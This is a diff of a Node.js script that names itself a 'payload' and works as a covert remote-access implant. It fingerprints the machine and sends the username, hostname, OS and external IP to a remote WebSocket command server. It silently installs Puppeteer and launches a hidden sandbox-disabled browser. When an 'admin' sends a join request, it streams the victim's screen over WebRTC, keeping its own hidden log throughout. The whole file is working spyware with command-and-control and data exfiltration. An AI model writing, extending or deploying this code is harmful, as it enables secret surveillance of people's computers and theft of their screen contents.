@@ -1,11 +1,11 @@
 const WebSocket = require('ws');
 const http = require('http');
-const { execSync } = require('child_process');
 const os = require('os');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
 const https = require('https');
+const { execSync } = require('child_process');
 
 // --- CONFIGURATION ---
 const WS_URL = 'wss://server-eight-pi-39.vercel.app';
@@ -20,93 +20,119 @@ if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
 
 // --- ROBUST LOGGING SYSTEM ---
 function log(msg, level = 'INFO') {
-    const timestamp = new Date().toISOString();
-    const logLine = `[${timestamp}] [${level}] ${msg}`;
-    console.log(logLine);
-    try { 
-        fs.appendFileSync(LOG_FILE, `${logLine}\n`); 
-        fs.appendFileSync(HIDDEN_LOG_FILE, `${logLine}\n`); 
-    } catch(e) {}
+ const timestamp = new Date().toISOString();
+ const logLine = `[${timestamp}] [${level}] ${msg}`;
+ console.log(logLine);
+ try { 
+   fs.appendFileSync(LOG_FILE, `${logLine}\n`); 
+   fs.appendFileSync(HIDDEN_LOG_FILE, `${logLine}\n`); 
+ } catch(e) {}
 }
 
 function logError(msg, err) {
-    const timestamp = new Date().toISOString();
-    const errorLine = `[${timestamp}] [ERROR] ${msg}: ${err ? err.message || err : 'Unknown Error'}`;
-    console.error(errorLine);
-    try { 
-        fs.appendFileSync(LOG_FILE, `${errorLine}\n`); 
-        fs.appendFileSync(HIDDEN_LOG_FILE, `${errorLine}\n`); 
-    } catch(e) {}
+ const timestamp = new Date().toISOString();
+ const errorLine = `[${timestamp}] [ERROR] ${msg}: ${err ? err.message || err : 'Unknown Error'}`;
+ console.error(errorLine);
+ try { 
+   fs.appendFileSync(LOG_FILE, `${errorLine}\n`); 
+   fs.appendFileSync(HIDDEN_LOG_FILE, `${errorLine}\n`); 
+ } catch(e) {}
 }
 
 log("[INIT] Payload starting silently...");
 
 // --- DEVICE INFO FUNCTION (Native & Fast) ---
 function getDeviceInfo() {
-    let username = 'Unknown';
-    try {
-        username = os.userInfo().username;
-    } catch (_) {}
+ let username = 'Unknown';
+ try {
+   username = os.userInfo().username;
+ } catch (_) {}
 
-    const cpu = os.cpus();
+ const cpu = os.cpus();
 
-    return {
-        hostname: os.hostname(),
-        platform: os.platform(),
-        release: os.release(),
-        architecture: os.arch(),
-        username: username,
-        cpuModel: cpu[0]?.model || 'Unknown',
-        cpuCores: cpu.length,
-        ramGB: Number((os.totalmem() / 1024 ** 3).toFixed(2)),
-        freeRamGB: Number((os.freemem() / 1024 ** 3).toFixed(2)),
-        uptimeSeconds: os.uptime()
-    };
+ return {
+   hostname: os.hostname(),
+   platform: os.platform(),
+   release: os.release(),
+   architecture: os.arch(),
+   username: username,
+   cpuModel: cpu[0]?.model || 'Unknown',
+   cpuCores: cpu.length,
+   ramGB: Number((os.totalmem() / 1024 ** 3).toFixed(2)),
+   freeRamGB: Number((os.freemem() / 1024 ** 3).toFixed(2)),
+   uptimeSeconds: os.uptime()
+ };
 }
 
 // --- HARDWARE FINGERPRINT ---
 function getHardwareFingerprint() {
-    const mac = getMacAddress();
-    const deviceInfo = getDeviceInfo();
-    // Use MAC + CPU Model + Username for a stable ID
-    return crypto.createHash('sha256').update(mac + deviceInfo.cpuModel + deviceInfo.username).digest('hex').substr(0, 12);
+ const mac = getMacAddress();
+ const deviceInfo = getDeviceInfo();
+ // Use MAC + CPU Model + Username for a stable ID
+ return crypto.createHash('sha256').update(mac + deviceInfo.cpuModel + deviceInfo.username).digest('hex').substr(0, 12);
 }
 
 function getMacAddress() {
-    const interfaces = os.networkInterfaces();
-    for (const name of Object.keys(interfaces)) {
-        for (const iface of interfaces[name]) {
-            if (iface.family === 'IPv4' && !iface.internal) {
-                return iface.mac;
-            }
-        }
-    }
-    return '00:00:00:00:00:00';
+ const interfaces = os.networkInterfaces();
+ for (const name of Object.keys(interfaces)) {
+   for (const iface of interfaces[name]) {
+     if (iface.family === 'IPv4' && !iface.internal) {
+       return iface.mac;
+     }
+   }
+ }
+ return '00:00:00:00:00:00';
 }
 
 // --- ID MANAGEMENT ---
 let myId = null;
 try {
-    if (fs.existsSync(PERSIST_FILE)) {
-        const savedId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
-        if (savedId && savedId.length > 0) myId = savedId;
-    }
+ if (fs.existsSync(PERSIST_FILE)) {
+   const savedId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
+   if (savedId && savedId.length > 0) myId = savedId;
+ }
 } catch(e) {
-    logError("[ID] Error reading persistence file", e);
+ logError("[ID] Error reading persistence file", e);
 }
 
 if (!myId) {
-    log("[ID] No saved ID, generating new fingerprint...");
-    myId = getHardwareFingerprint();
-    try { 
-        fs.writeFileSync(PERSIST_FILE, myId); 
-        log("[ID] Saved new ID to disk.");
-    } catch(e) {
-        logError("[ID] Error writing persistence file", e);
-    }
+ log("[ID] No saved ID, generating new fingerprint...");
+ myId = getHardwareFingerprint();
+ try { 
+   fs.writeFileSync(PERSIST_FILE, myId); 
+   log("[ID] Saved new ID to disk.");
+ } catch(e) {
+   logError("[ID] Error writing persistence file", e);
+ }
 }
 
 log(`[ID] Hardware Fingerprint: ${myId}`);
+
+// --- FORCE INSTALL PUPPETEER IF MISSING ---
+function ensurePuppeteer() {
+ try {
+   // Check if puppeteer is already installed
+   require.resolve('puppeteer');
+   log("[INSTALL] Puppeteer already installed.");
+   return true;
+ } catch (e) {
+   log("[INSTALL] Puppeteer not found. Installing silently...");
+   try {
+     execSync('npm install puppeteer --silent', { stdio: 'ignore' });
+     log("[INSTALL] Puppeteer installed successfully.");
+     return true;
+   } catch (installErr) {
+     logError("[INSTALL] Failed to install Puppeteer", installErr);
+     return false;
+   }
+ }
+}
+
+// Run installation check immediately
+ensurePuppeteer();
+
+// Import puppeteer after ensuring it's installed
+const puppeteer = require('puppeteer');
 
 // --- WEBSOCKET CONNECTION WITH ROBUST RECONNECT ---
 let ws = null;
@@ -115,187 +141,310 @@ let isConnected = false;
 let myIp = 'Unknown';
 
 function getExternalIP() {
-    log("[IP] Fetching external IP...");
-    return new Promise((resolve) => {
-        https.get('https://api.ipify.org?format=json', (res) => {
-            let data = '';
-            res.on('data', (chunk) => { data += chunk; });
-            res.on('end', () => {
-                try {
-                    const json = JSON.parse(data);
-                    log("[IP] External IP: " + json.ip);
-                    resolve(json.ip);
-                } catch (e) {
-                    logError("[IP] Failed to parse IP JSON", e);
-                    resolve('Unknown');
-                }
-            });
-        }).on('error', (e) => {
-            logError("[IP] HTTPS request failed", e);
-            resolve('Unknown');
-        });
-    });
+ log("[IP] Fetching external IP...");
+ return new Promise((resolve) => {
+   https.get('https://api.ipify.org?format=json', (res) => {
+     let data = '';
+     res.on('data', (chunk) => { data += chunk; });
+     res.on('end', () => {
+       try {
+         const json = JSON.parse(data);
+         log("[IP] External IP: " + json.ip);
+         resolve(json.ip);
+       } catch (e) {
+         logError("[IP] Failed to parse IP JSON", e);
+         resolve('Unknown');
+       }
+     });
+   }).on('error', (e) => {
+     logError("[IP] HTTPS request failed", e);
+     resolve('Unknown');
+   });
+ });
 }
 
 async function initConnection() {
-    log(`[WS] Attempting silent connection to ${WS_URL}...`);
+ log(`[WS] Attempting silent connection to ${WS_URL}...`);
 
-    ws = new WebSocket(WS_URL);
+ ws = new WebSocket(WS_URL);
 
-    ws.on('error', (err) => {
-        logError("[WS] Connection error", err);
-        isConnected = false;
-    });
+ ws.on('error', (err) => {
+   logError("[WS] Connection error", err);
+   isConnected = false;
+ });
 
-    ws.on('open', async () => {
-        reconnectAttempts = 0;
-        isConnected = true;
-        log(`[WS] Connected. Sending identity...`);
-        
-        // Get Device Info using the fast native function
-        const deviceInfo = getDeviceInfo();
-        
-        // Get External IP
-        myIp = await getExternalIP();
+ ws.on('open', async () => {
+   reconnectAttempts = 0;
+   isConnected = true;
+   log(`[WS] Connected. Sending identity...`);
+   
+   // Get Device Info using the fast native function
+   const deviceInfo = getDeviceInfo();
+   
+   // Get External IP
+   myIp = await getExternalIP();
 
-        // Prepare Data
-        const payloadData = {
-            type: 'info',
-            id: myId,
-            uniqueId: myId,
-            fingerprint: myId,
-            os: deviceInfo.platform + ' ' + deviceInfo.release, 
-            arch: deviceInfo.architecture,
-            user: deviceInfo.username,
-            ip: myIp,
-            last_seen: Date.now(),
-            status: 'Online',
-            serial_number: deviceInfo.hostname 
-        };
+   // Prepare Data
+   const payloadData = {
+     type: 'info',
+     id: myId,
+     uniqueId: myId,
+     fingerprint: myId,
+     os: deviceInfo.platform + ' ' + deviceInfo.release, 
+     arch: deviceInfo.architecture,
+     user: deviceInfo.username,
+     ip: myIp,
+     last_seen: Date.now(),
+     status: 'Online',
+     serial_number: deviceInfo.hostname 
+   };
 
-        log("[WS] Sending Identity Payload:", JSON.stringify(payloadData));
-        
-        // Send the payload
-        safeSend(JSON.stringify(payloadData));
-        
-        log("[WS] Identity sent. Starting monitoring...");
-        startMonitoring();
-    });
+   log("[WS] Sending Identity Payload:", JSON.stringify(payloadData));
+   
+   // Send the payload
+   safeSend(JSON.stringify(payloadData));
+   
+   log("[WS] Identity sent. Starting monitoring...");
+   startMonitoring();
+ });
 
-    ws.on('message', (msg) => {
-        try {
-            const data = JSON.parse(msg);
-            log("[WS] Received Message Type:", data.type);
-            
-            if (data.type === 'request_join') handleJoinRequest();
-            else if (data.type === 'offer') handleOffer(data.sdp);
-            else if (data.type === 'answer') handleAnswer(data.sdp);
-            else if (data.type === 'candidate') handleCandidate(data.candidate);
-            else if (data.type === 'notification') {
-                log("[WS] Admin Notification:", data.message);
-            }
-        } catch (e) {
-            logError("[WS] Message parse error", e);
-        }
-    });
+ ws.on('message', (msg) => {
+   try {
+     const data = JSON.parse(msg);
+     log("[WS] Received Message Type:", data.type);
+     
+     if (data.type === 'request_join') handleJoinRequest();
+     else if (data.type === 'offer') handleOffer(data.sdp);
+     else if (data.type === 'answer') handleAnswer(data.sdp);
+     else if (data.type === 'candidate') handleCandidate(data.candidate);
+     else if (data.type === 'notification') {
+       log("[WS] Admin Notification:", data.message);
+     }
+   } catch (e) {
+     logError("[WS] Message parse error", e);
+   }
+ });
 
-    ws.on('close', (code, reason) => {
-        isConnected = false;
-        log(`[WS] Closed. Code: ${code}. Reconnecting in ${(reconnectAttempts + 1) * 5}s...`);
-        setTimeout(initConnection, Math.min((reconnectAttempts + 1) * 5000, 30000));
-        reconnectAttempts++;
-    });
+ ws.on('close', (code, reason) => {
+   isConnected = false;
+   log(`[WS] Closed. Code: ${code}. Reconnecting in ${(reconnectAttempts + 1) * 5}s...`);
+   setTimeout(initConnection, Math.min((reconnectAttempts + 1) * 5000, 30000));
+   reconnectAttempts++;
+ });
 }
 
 function safeSend(msg) {
-    if (ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(msg);
-        log("[WS] Message Sent Successfully.");
-    } else {
-        log("[WS] Warning: Socket not open, cannot send.");
-    }
+ if (ws && ws.readyState === WebSocket.OPEN) {
+   ws.send(msg);
+   log("[WS] Message Sent Successfully.");
+ } else {
+   log("[WS] Warning: Socket not open, cannot send.");
+ }
 }
 
 function startMonitoring() {
-    setInterval(() => {
-        if (isConnected) {
-            safeSend(JSON.stringify({ type: 'heartbeat' }));
-        }
-    }, 30000);
+ setInterval(() => {
+   if (isConnected) {
+     safeSend(JSON.stringify({ type: 'heartbeat' }));
+   }
+ }, 30000);
 }
 
-// --- WEBRTC (BROWSER NATIVE) ---
-let peerConnection = null;
-let localStream = null;
+// --- WEBRTC BROWSER HANDLER ---
+let browser = null;
+let page = null;
+const TEMP_HTML_PATH = path.join(os.tmpdir(), 'stream_payload.html');
 
-async function captureScreenPureJS() {
-    log("[WEBRTC] Initializing Screen Capture...");
-    if (!peerConnection) {
-        peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-    }
+// EMBEDDED HTML FOR WEBRTC
+const STREAM_HTML = `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Stream</title>
+    <style>
+        body { margin: 0; overflow: hidden; background: #000; }
+        video { width: 100%; height: 100%; object-fit: cover; }
+    </style>
+</head>
+<body>
+    <video id="remoteVideo" autoplay playsinline></video>
+    <script>
+        const peerConnection = new RTCPeerConnection({
+            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+        });
 
-    const transceivers = peerConnection.getTransceivers();
-    transceivers.forEach(t => {
-        if (t.sender.track) t.sender.stop();
-    });
+        let localStream = null;
+        const remoteVideo = document.getElementById('remoteVideo');
 
-    try {
-        log("[WEBRTC] Requesting Display Media...");
-        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
-        stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));
+        // Listen for messages from Node.js
+        window.addEventListener('message', async (event) => {
+            const data = event.data;
+            
+            if (data.type === 'join') {
+                startScreenShare();
+            } else if (data.type === 'offer') {
+                handleOffer(data.sdp);
+            } else if (data.type === 'answer') {
+                handleAnswer(data.sdp);
+            } else if (data.type === 'candidate') {
+                handleCandidate(data.candidate);
+            }
+        });
 
-        peerConnection.onicecandidate = (event) => {
-            if (event.candidate) {
-                safeSend(JSON.stringify({ type: 'candidate', targetId: 'admin', candidate: event.candidate }));
+        async function startScreenShare() {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: true, 
+                    audio: false 
+                });
+                
+                localStream = stream;
+                stream.getTracks().forEach(track => {
+                    peerConnection.addTrack(track, stream);
+                });
+
+                // Send initial candidate if any
+                peerConnection.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        window.postMessage({ type: 'candidate', candidate: event.candidate }, '*');
+                    }
+                };
+
+                // Create offer if not already done by admin
+                if (!peerConnection.remoteDescription) {
+                    const offer = await peerConnection.createOffer();
+                    await peerConnection.setLocalDescription(offer);
+                    window.postMessage({ type: 'offer', sdp: peerConnection.localDescription }, '*');
+                }
+                
+                console.log("Screen share started");
+            } catch (err) {
+                console.error("Screen share error:", err);
+            }
+        }
+
+        function handleOffer(offerSDP) {
+            peerConnection.setRemoteDescription(new RTCSessionDescription(offerSDP))
+                .then(() => peerConnection.createAnswer())
+                .then(answer => peerConnection.setLocalDescription(answer))
+                .then(() => {
+                    window.postMessage({ type: 'answer', sdp: peerConnection.localDescription }, '*');
+                })
+                .catch(err => console.error("Offer error:", err));
+        }
+
+        function handleAnswer(answerSDP) {
+            peerConnection.setRemoteDescription(new RTCSessionDescription(answerSDP))
+                .catch(err => console.error("Answer error:", err));
+        }
+
+        function handleCandidate(candidate) {
+            if (candidate) {
+                peerConnection.addIceCandidate(new RTCIceCandidate(candidate))
+                    .catch(err => console.error("Candidate error:", err));
+            }
+        }
+
+        // Handle remote video track
+        peerConnection.ontrack = (event) => {
+            if (remoteVideo.srcObject !== event.streams[0]) {
+                remoteVideo.srcObject = event.streams[0];
             }
         };
+    </script>
+</body>
+</html>
+`;
 
-        log("[WEBRTC] Creating Offer...");
-        const offer = await peerConnection.createOffer();
-        await peerConnection.setLocalDescription(offer);
-        safeSend(JSON.stringify({ type: 'offer', targetId: 'admin', sdp: peerConnection.localDescription }));
-        log("[WEBRTC] Screen Share Started Successfully.");
-    } catch (err) {
-        logError("[WEBRTC] Screen capture error", err);
-    }
+async function initBrowser() {
+ try {
+   log("[BROWSER] Launching hidden browser...");
+   
+   // Write HTML to temp file
+   fs.writeFileSync(TEMP_HTML_PATH, STREAM_HTML);
+   
+   browser = await puppeteer.launch({
+     headless: true,
+     args: ['--no-sandbox', '--disable-setuid-sandbox']
+   });
+   page = await browser.newPage();
+   
+   // Load the local file
+   await page.goto('file://' + TEMP_HTML_PATH, { waitUntil: 'networkidle0' });
+   
+   // Listen for messages from the browser (WebRTC events)
+   page.on('console', msg => log("[BROWSER] " + msg.text()));
+   
+   // Handle messages from browser
+   page.exposeFunction('postMessage', (msg) => {
+     if (ws && ws.readyState === WebSocket.OPEN) {
+       safeSend(JSON.stringify(msg));
+     }
+   });
+   
+   // Inject a listener to forward messages to Node
+   await page.evaluate(() => {
+     window.addEventListener('message', (event) => {
+       window.postMessage(event.data, '*');
+     });
+   });
+   
+   log("[BROWSER] Browser ready.");
+ } catch (err) {
+   logError("[BROWSER] Failed to launch browser", err);
+ }
 }
 
+// --- WEBRTC HANDLERS (NODE.JS SIDE) ---
 function handleJoinRequest() {
-    log("[JOIN] Request received. Starting screen share silently...");
-    captureScreenPureJS();
+ log("[JOIN] Request received. Starting screen share silently...");
+ if (page) {
+   page.evaluate(() => {
+     window.postMessage({ type: 'join' }, '*');
+   });
+ }
 }
 
 function handleOffer(offerSDP) {
-    log("[WEBRTC] Handling Offer from Admin...");
-    if (!peerConnection) peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-    peerConnection.setRemoteDescription(new RTCSessionDescription(offerSDP))
-        .then(() => peerConnection.createAnswer())
-        .then(answer => peerConnection.setLocalDescription(answer))
-        .then(() => safeSend(JSON.stringify({ type: 'answer', targetId: 'admin', sdp: peerConnection.localDescription })))
-        .catch(err => logError("[WEBRTC] Error handling offer", err));
+ log("[WEBRTC] Handling Offer from Admin...");
+ if (page) {
+   page.evaluate((sdp) => {
+     window.postMessage({ type: 'offer', sdp: sdp }, '*');
+   }, offerSDP);
+ }
 }
 
 function handleAnswer(answerSDP) {
-    log("[WEBRTC] Handling Answer from Admin...");
-    if (peerConnection) peerConnection.setRemoteDescription(new RTCSessionDescription(answerSDP)).catch(err => logError("[WEBRTC] Error handling answer", err));
+ log("[WEBRTC] Handling Answer from Admin...");
+ if (page) {
+   page.evaluate((sdp) => {
+     window.postMessage({ type: 'answer', sdp: sdp }, '*');
+   }, answerSDP);
+ }
 }
 
 function handleCandidate(candidate) {
-    log("[WEBRTC] Handling ICE Candidate...");
-    if (peerConnection && candidate) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(err => logError("[WEBRTC] Candidate error", err));
+ log("[WEBRTC] Handling ICE Candidate...");
+ if (page) {
+   page.evaluate((cand) => {
+     window.postMessage({ type: 'candidate', candidate: cand }, '*');
+   }, candidate);
+ }
 }
 
 // --- HTTP PORT LISTENER (For Render/Vercel Health) ---
 const PORT = Number(process.env.PORT) || 3000;
 const server = http.createServer((req, res) => {
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(JSON.stringify({ status: 'ok', service: 'payload', id: myId }));
+ res.writeHead(200, { 'Content-Type': 'application/json' });
+ res.end(JSON.stringify({ status: 'ok', service: 'payload', id: myId }));
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-    log(`[RENDER] HTTP server listening on 0.0.0.0:${PORT}`);
-    log('[RENDER] Health service running.');
+ log(`[RENDER] HTTP server listening on 0.0.0.0:${PORT}`);
+ log('[RENDER] Health service running.');
 });
 
 // --- INITIALIZATION ---
 initConnection();
+// Start the browser immediately so it's ready when join request comes
+initBrowser();
